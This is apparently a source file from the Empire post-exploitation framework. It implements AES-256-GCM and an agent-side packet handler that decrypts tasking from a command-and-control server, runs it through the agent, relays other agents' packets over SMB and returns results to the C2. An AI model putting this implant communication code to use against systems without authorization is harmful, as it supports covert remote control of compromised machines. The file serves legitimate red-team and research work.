"""
Pure-Python AES-256-GCM AEAD cipher and routing packet handler for Empire agents.

Provides FIPS-compliant AES-256-GCM authenticated encryption using the AES
block cipher from aes.py (which must be included before this file in stager
templates).

The PacketHandler class manages routing packet construction, parsing, and
agent communication.
"""
import base64
import os
import struct
import hmac


# ---------------------------------------------------------------------------
# GF(2^128) multiplication for GHASH (used by AES-GCM)
# ---------------------------------------------------------------------------

def _bytes_to_int(b):
    """Convert bytes to big-endian integer."""
    result = 0
    for byte in b:
        result = (result << 8) | byte
    return result


def _int_to_bytes(n, length=16):
    """Convert integer to big-endian bytes of given length."""
    result = bytearray(length)
    for i in range(length - 1, -1, -1):
        result[i] = n & 0xFF
        n >>= 8
    return bytes(result)


def _gf128_mul(x, y):
    """Multiply two 128-bit numbers in GF(2^128) with the GCM polynomial."""
    R = 0xE1000000000000000000000000000000  # GCM reduction polynomial
    z = 0
    v = y
    for i in range(128):
        if (x >> (127 - i)) & 1:
            z ^= v
        if v & 1:
            v = (v >> 1) ^ R
        else:
            v >>= 1
    return z


def _ghash(h_int, aad, ciphertext):
    """Compute GHASH over AAD and ciphertext using hash subkey H."""
    def _pad_to_16(data):
        r = len(data) % 16
        if r:
            return data + b'\x00' * (16 - r)
        return data

    data = _pad_to_16(aad) + _pad_to_16(ciphertext)
    # Pack 64-bit big-endian lengths without struct '>Q' (IronPython compat)
    aad_bits = len(aad) * 8
    ct_bits = len(ciphertext) * 8
    len_block = bytearray(16)
    for i in range(7, -1, -1):
        len_block[i] = aad_bits & 0xFF
        aad_bits >>= 8
        len_block[8 + i] = ct_bits & 0xFF
        ct_bits >>= 8
    data += bytes(len_block)

    y = 0
    for i in range(0, len(data), 16):
        block = _bytes_to_int(data[i:i+16])
        y = _gf128_mul(y ^ block, h_int)
    return y


# ---------------------------------------------------------------------------
# AES-GCM using the AES block cipher from aes.py
# ---------------------------------------------------------------------------

def _aes_ecb_encrypt_block(aes_obj, block):
    """Encrypt a single 16-byte block using AES ECB."""
    return bytearray(aes_obj.encrypt(list(block)))


def _inc32(counter_block):
    """Increment the rightmost 32 bits of a 16-byte counter block."""
    cb = bytearray(counter_block)
    c = struct.unpack('>I', bytes(cb[12:16]))[0]
    c = (c + 1) & 0xFFFFFFFF
    cb[12:16] = struct.pack('>I', c)
    return bytes(cb)


def _gctr(aes_obj, icb, plaintext):
    """AES-GCM Counter mode encryption."""
    if not plaintext:
        return b''

    result = bytearray()
    cb = icb
    for i in range(0, len(plaintext), 16):
        block = plaintext[i:i+16]
        keystream = _aes_ecb_encrypt_block(aes_obj, cb)
        for j in range(len(block)):
            result.append(block[j] ^ keystream[j])
        cb = _inc32(cb)
    return bytes(result)


class TagInvalidException(Exception):
    pass


class AES256GCM(object):
    """Pure-Python AES-256-GCM AEAD cipher.

    Uses the AES class from aes.py for the underlying block cipher.
    API matches the previous ChaCha20Poly1305 class: encrypt/decrypt and seal/open.
    """

    def __init__(self, key, implementation='python'):
        if len(key) != 32:
            raise ValueError("Key must be 256 bit long")

        self.isBlockCipher = True
        self.isAEAD = True
        self.nonceLength = 12
        self.tagLength = 16
        self.implementation = implementation
        self.name = "aes-256-gcm"
        self.key = key
        self._aes = AES(bytes(key))

    def _compute_tag(self, nonce, aad, ciphertext):
        """Compute the GCM authentication tag."""
        # H = AES_K(0^128)
        h_block = _aes_ecb_encrypt_block(self._aes, b'\x00' * 16)
        h_int = _bytes_to_int(h_block)

        # J0 = nonce || 0^31 || 1 (for 96-bit nonce)
        j0 = nonce + b'\x00\x00\x00\x01'

        # GHASH
        s = _ghash(h_int, aad, ciphertext)

        # T = GCTR_K(J0, S)
        s_bytes = _int_to_bytes(s)
        tag = _gctr(self._aes, j0, s_bytes)
        return tag

    def seal(self, nonce, plaintext, data):
        """Encrypt and authenticate. Returns ciphertext || tag (16 bytes)."""
        if len(nonce) != 12:
            raise ValueError("Nonce must be 96 bit long")

        aad = data if data is not None else b''
        if isinstance(aad, str):
            aad = aad.encode('utf-8')

        # J0 = nonce || 0^31 || 1
        j0 = nonce + b'\x00\x00\x00\x01'
        # Start counter at J0 + 1 for encryption
        icb = _inc32(j0)

        ciphertext = _gctr(self._aes, icb, plaintext)
        tag = self._compute_tag(nonce, aad, ciphertext)

        return ciphertext + tag

    def open(self, nonce, ciphertext_and_tag, data):
        """Decrypt and verify. Returns plaintext or raises TagInvalidException."""
        if len(nonce) != 12:
            raise ValueError("Nonce must be 96 bit long")

        if len(ciphertext_and_tag) < 16:
            raise TagInvalidException("Ciphertext too short")

        aad = data if data is not None else b''
        if isinstance(aad, str):
            aad = aad.encode('utf-8')

        ciphertext = ciphertext_and_tag[:-16]
        tag = ciphertext_and_tag[-16:]

        expected_tag = self._compute_tag(nonce, aad, ciphertext)

        # Constant-time comparison
        diff = 0
        for a, b in zip(tag, expected_tag):
            diff |= a ^ b
        if diff != 0:
            raise TagInvalidException("Authentication tag mismatch")

        j0 = nonce + b'\x00\x00\x00\x01'
        icb = _inc32(j0)
        return _gctr(self._aes, icb, ciphertext)

    def encrypt(self, nonce, plaintext, associated_data=None):
        return self.seal(nonce, plaintext, associated_data if associated_data is not None else b'')

    def decrypt(self, nonce, ciphertext, associated_data=None):
        return self.open(nonce, ciphertext, associated_data if associated_data is not None else b'')


class PacketHandler:
    def __init__(self, agent, staging_key, session_id, key=None):
        self.agent = agent
        self.key = key
        self.staging_key = staging_key
        self.session_id = session_id
        self.missedCheckins = 0

        self.language_list = {
            'NONE': 0,
            'POWERSHELL': 1,
            'PYTHON': 2
        }
        self.language_ids = {ID: name for name, ID in self.language_list.items()}

        self.meta = {
            'NONE': 0,
            'STAGING_REQUEST': 1,
            'STAGING_RESPONSE': 2,
            'TASKING_REQUEST': 3,
            'RESULT_POST': 4,
            'SERVER_RESPONSE': 5
        }
        self.meta_ids = {ID: name for name, ID in self.meta.items()}

        self.additional = {}
        self.additional_ids = {ID: name for name, ID in self.additional.items()}


    def parse_routing_packet(self, staging_key, data):
        """
        Decodes the AES-256-GCM routing packet and parses raw agent data into:

            {sessionID : (language, meta, additional, [encData]), ...}

        Routing packet format:

            Routing Packet:
            +---------+----------------------------+--------------------------+
            |   IV    | AES-256-GCM(RoutingData)   | AESc(client packet data) | ...
            +---------+----------------------------+--------------------------+
            |    12   |             32             |          length          |
            +---------+----------------------------+--------------------------+
        """

        iv_length = 12
        aead_header_length = iv_length + 32

        if data:
            results = {}
            offset = 0

            if len(data) >= aead_header_length:

                while True:

                    if len(data) - offset < 44:
                        break

                    iv = data[0 + offset:iv_length + offset]
                    aead_data = data[iv_length + offset:aead_header_length + offset]
                    enc_handler = AES256GCM(staging_key)

                    try:
                        decrypted = enc_handler.open(iv, aead_data, b"")
                    except TagInvalidException:
                        break
                    session_id = decrypted[0:8]
                    if isinstance(session_id, bytes):
                        session_id = session_id.decode('UTF-8')

                    (language, meta, additional, length) = struct.unpack("=BBHL", decrypted[8:])

                    if length < 0:
                        encData = None
                    else:
                        encData = data[(aead_header_length + offset):(aead_header_length + offset + length)]

                    results[session_id] = (self.language_ids.get(language, 'NONE'), self.meta_ids.get(meta, 'NONE'),
                                            self.additional_ids.get(additional, 'NONE'), encData)

                    remaining_data = data[aead_header_length + offset + length:]
                    if not remaining_data or remaining_data == '':
                        break

                    offset += aead_header_length + length
                return results

            else:
                return None

        else:
            return None


    def build_routing_packet(self, staging_key, session_id, meta=0, additional=0, enc_data=b''):
        """
        Builds an AES-256-GCM encrypted routing packet.

        packet format:

            Routing Packet:
            +---------+----------------------------+--------------------------+
            |   IV    | AES-256-GCM(RoutingData)   | AESc(client packet data) | ...
            +---------+----------------------------+--------------------------+
            |    12   |             32             |          length          |
            +---------+----------------------------+--------------------------+
        """
        if isinstance(session_id, str):
            session_id = session_id.encode('UTF-8')
        data = session_id + struct.pack("=BBHL", 2, meta, additional, len(enc_data))
        iv = os.urandom(12)
        key = staging_key

        enc_handler = AES256GCM(key)
        enc_data_out = enc_handler.seal(iv, data, b"")
        output_pkt = iv + enc_data_out + enc_data
        return output_pkt

    def decode_routing_packet(self, data):
        """
        Parse ALL routing packets and only process the ones applicable
        to this agent.
        """
        packets = self.parse_routing_packet(self.staging_key, data)
        if packets is None:
            return
        for agent_id, packet in packets.items():
            if agent_id == self.session_id:
                (language, meta, additional, enc_data) = packet
                self.process_tasking(enc_data)
            else:
                smb_server_queue.Enqueue(base64.b64encode(data).decode('UTF-8'))

    def build_response_packet(self, tasking_id, packet_data, result_id=0):
        """
        Build a task packet for an agent.

            [2 bytes] - type
            [2 bytes] - total # of packets
            [2 bytes] - packet #
            [2 bytes] - task/result ID
            [4 bytes] - length
            [X...]    - result data

            +------+--------------------+----------+---------+--------+-----------+
            | Type | total # of packets | packet # | task ID | Length | task data |
            +------+--------------------+--------------------+--------+-----------+
            |  2   |         2          |    2     |    2    |   4    | <Length>  |
            +------+--------------------+----------+---------+--------+-----------+
        """
        packetType = struct.pack("=H", tasking_id)
        totalPacket = struct.pack("=H", 1)
        packetNum = struct.pack("=H", 1)
        result_id = struct.pack("=H", result_id)

        if packet_data:
            if isinstance(packet_data, str):
                packet_data = base64.b64encode(packet_data.encode("utf-8", "ignore"))
            else:
                packet_data = base64.b64encode(
                    packet_data.decode("utf-8").encode("utf-8", "ignore")
                )
            if len(packet_data) % 4:
                packet_data += "=" * (4 - len(packet_data) % 4)

            length = struct.pack("=L", len(packet_data))
            return packetType + totalPacket + packetNum + result_id + length + packet_data
        else:
            length = struct.pack("=L", 0)
            return packetType + totalPacket + packetNum + result_id + length

    def parse_task_packet(self, packet, offset=0):
        """
        Parse a result packet.
        """
        try:
            packetType = struct.unpack("=H", packet[0 + offset:2 + offset])[0]
            totalPacket = struct.unpack("=H", packet[2 + offset:4 + offset])[0]
            packetNum = struct.unpack("=H", packet[4 + offset:6 + offset])[0]
            resultID = struct.unpack("=H", packet[6 + offset:8 + offset])[0]
            length = struct.unpack("=L", packet[8 + offset:12 + offset])[0]
            try:
                packetData = packet.decode("UTF-8")[12 + offset:12 + offset + length]
            except:
                packetData = packet[12 + offset:12 + offset + length].decode("latin-1")
            try:
                remainingData = packet.decode("UTF-8")[12 + offset + length:]
            except:
                remainingData = packet[12 + offset + length:].decode("latin-1")
            return (packetType, totalPacket, packetNum, resultID, length, packetData, remainingData)
        except Exception as e:
            print("parse_task_packet exception:", e)
            return (None, None, None, None, None, None, None)

    def process_tasking(self, data):
        # processes an encrypted data packet
        #   -decrypts/verifies the response to get
        #   -extracts the packets and processes each
        try:
            # aes_decrypt_and_verify is in stager.py
            tasking = aes_decrypt_and_verify(self.key, data).encode("UTF-8")
            (
                packetType,
                totalPacket,
                packetNum,
                resultID,
                length,
                data,
                remainingData,
            ) = self.parse_task_packet(tasking)

            # execute/process the packets and get any response
            resultPackets = ""
            result = self.agent.process_packet(packetType, data, resultID)

            if result:
                resultPackets += result

            packetOffset = 12 + length
            while remainingData and remainingData != "":
                (
                    packetType,
                    totalPacket,
                    packetNum,
                    resultID,
                    length,
                    data,
                    remainingData,
                ) = self.parse_task_packet(tasking, offset=packetOffset)
                result = self.agent.process_packet(packetType, data, resultID)
                if result:
                    resultPackets += result

                packetOffset += 12 + length

            # send_message() is patched in from the listener module
            self.send_message(resultPackets)

        except Exception as e:
            print(e)
            pass

    def process_job_tasking(self, result):
        # process job data packets
        #  - returns to the C2
        # execute/process the packets and get any response
        try:
            resultPackets = b""
            if result:
                resultPackets += result
            # send packets
            self.send_message(resultPackets)
        except Exception as e:
            print("processJobTasking exception:", e)
            pass
